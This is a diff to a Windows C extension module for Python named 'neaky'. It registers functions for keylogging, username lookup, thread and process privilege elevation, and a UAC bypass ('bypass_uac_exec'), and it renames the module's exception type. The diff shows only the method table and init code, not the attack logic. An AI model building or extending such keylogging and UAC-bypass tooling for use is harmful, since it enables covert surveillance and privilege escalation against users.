@@ -6,13 +6,15 @@
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
 
-HINSTANCE hInst = NULL;
-HINSTANCE hModule; // dll模块实例
+#include "neakymodule.h"
+
+HINSTANCE hInst = INVALID_HANDLE_VALUE;
+HINSTANCE hModule = INVALID_HANDLE_VALUE; // dll模块实例
 
 WCHAR executable_path[MAX_PATH + 1];
 WCHAR module_path[MAX_PATH + 1];
 
-static PyObject *NeakyError;
+PyObject *NeakyError;
 
 static PyObject *
 neaky_system(PyObject *self, PyObject *args)
@@ -53,10 +55,22 @@ static PyMethodDef NeakyMethods[] = {
      "Start keylogging and print to stdout."},
     {"keylog_to_file", neaky_keylog_to_file, METH_VARARGS,
      keylog_to_file_doc},
-    {"keylog_to_file_stop", neaky_keylog_to_file_stop, METH_NOARGS,
+    {"keylog_stop", neaky_keylog_stop, METH_NOARGS,
+     "Stop keylogging to file."},
+    {"hook_keylog_stdout", neaky_hook_keylog_stdout, METH_NOARGS,
+     "Start keylogging and print to stdout."},
+    {"hook_keylog_stop", neaky_hook_keylog_stop, METH_NOARGS,
      "Stop keylogging to file."},
     {"message_loop", neaky_message_loop, METH_NOARGS,
      "Start message loop."},
+    {"get_username", neaky_get_username, METH_VARARGS,
+     get_username_doc},
+    {"elevate_thread", neaky_elevate_thread, METH_VARARGS,
+     elevate_thread_doc},
+    {"elevate_execute", neaky_elevate_execute, METH_VARARGS,
+     elevate_execute_doc},
+    {"bypass_uac_exec", neaky_bypass_uac_exec, METH_VARARGS,
+     elevate_execute_doc},
     {NULL, NULL, 0, NULL} /* Sentinel */
 };
 
@@ -82,9 +96,9 @@ PyInit_neaky(void)
     if (m == NULL)
         return NULL;
 
-    NeakyError = PyErr_NewException("spam.error", NULL, NULL);
+    NeakyError = PyErr_NewException("neaky.Exception", NULL, NULL);
     Py_XINCREF(NeakyError);
-    if (PyModule_AddObject(m, "error", NeakyError) < 0)
+    if (PyModule_AddObject(m, "Exception", NeakyError) < 0)
     {
         Py_XDECREF(NeakyError);
         Py_CLEAR(NeakyError);
@@ -95,10 +109,15 @@ PyInit_neaky(void)
     // module specific init code here
     hInst = GetModuleHandle(NULL);
     if(!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (void*)PyInit_neaky, &hModule)) {
-        // throw err
+        // PyErr_SetString(NeakyError, "get executable path failed.");
+        puts("Get executable path failed.");
     }
     GetModuleFileName(NULL, (LPWSTR)executable_path, MAX_PATH);
     GetModuleFileName(hModule, (LPWSTR)module_path, MAX_PATH);
+
+    // printf("Current executable path: %ls\n", executable_path);
+    // printf("Current module path: %ls\n", module_path);
+    // _putws(L"-------neaky init-------\n");
 
     return m;
 }
